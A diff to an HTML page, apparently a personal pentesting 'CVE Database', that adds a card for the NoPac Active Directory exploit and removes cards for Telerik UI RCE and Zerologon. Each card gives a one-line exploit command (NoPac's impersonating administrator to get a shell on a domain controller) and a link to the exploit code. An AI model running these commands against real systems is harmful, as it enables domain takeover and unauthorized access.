@@ -19,13 +19,30 @@
     <h1 class="glitch-pages" data-text=">_r4ven">> CVE Database<span class="cursor">_</span></h1>
 
     <div class="nav-buttons">
+      <a class="btn" href="#active">Active Directory</a>
       <a class="btn" href="#web">Web</a>
       <a class="btn" href="#privesc">Privesc</a>
-      <a class="btn" href="#deserialization">Deserialization</a>
-      <a class="btn" href="#auth">Auth Bypass</a>
       <a class="btn" href="/">/Return to Base</a>
     </div>
   </div>
+
+  <section id="web">
+    <h2>// Active Directory</h2>
+
+    <div class="card">
+      <h3>CVE 2021-42278 and CVE-2021-42287 - NoPac</h3>
+      <p><strong>Afect:</strong> Security Account Manager (SAM) & Kerberos Privilege Attribute Certificate (PAC) in ADDS.</p>
+      <p>NoPac uses many tools in Impacket to communicate with, upload a payload, and issue commands from the attack host to the target DC</p>
+      <p>
+         ------------------------------------------------------------------------------
+      </p>
+      <p>Running NoPac & Getting a Shell:</p>
+      <pre><code>sudo python3 noPac.py domain/user:password -dc-ip $IP  -dc-host DOMAIN-EX-DC01 -shell --impersonate administrator -use-ldap</code></pre>
+      <div class="selection">
+        <a href="https://github.com/Ridter/noPac" class="btn">Exploit! ></a>
+      </div>
+    </div>
+  </section>
 
   <!-- Web -->
   <section id="web">
@@ -67,35 +84,8 @@
     </div>
   </section>
 
-  <!-- Deserialization -->
-  <section id="deserialization">
-    <h2>// Deserialization</h2>
-
-    <div class="card">
-      <h3>CVE-2019-18935 – Telerik UI RCE</h3>
-      <p><strong>Afecta:</strong> Telerik UI para ASP.NET AJAX</p>
-      <p>Permite ejecutar comandos en el servidor explotando una falla en el sistema de serialización.</p>
-      <pre><code class="language-bash">python3 telerik_exploit.py -u http://target</code></pre>
-      <div class="selection">
-        <a href="https://github.com/bao7uo/dp_crypto" class="btn"> Script PoC ></a>
-      </div>
-    </div>
-  </section>
-
-  <!-- Auth Bypass -->
-  <section id="auth">
-    <h2>// Auth Bypass</h2>
-
-    <div class="card">
-      <h3>CVE-2020-1472 – Zerologon</h3>
-      <p><strong>Afecta:</strong> Domain Controllers Windows Server</p>
-      <p>Permite autenticación sin contraseña explotando Netlogon con vectores nulos.</p>
-      <pre><code class="language-bash">python3 zerologon_tester.py 10.10.10.1</code></pre>
-      <div class="selection">
-        <a href="https://github.com/SecuraBV/CVE-2020-1472" class="btn">Exploit ></a>
-      </div>
-    </div>
-  </section>
+  
+  
 
   <!-- Sidebar -->
   <div class="social-sidebar fade-sidebar">
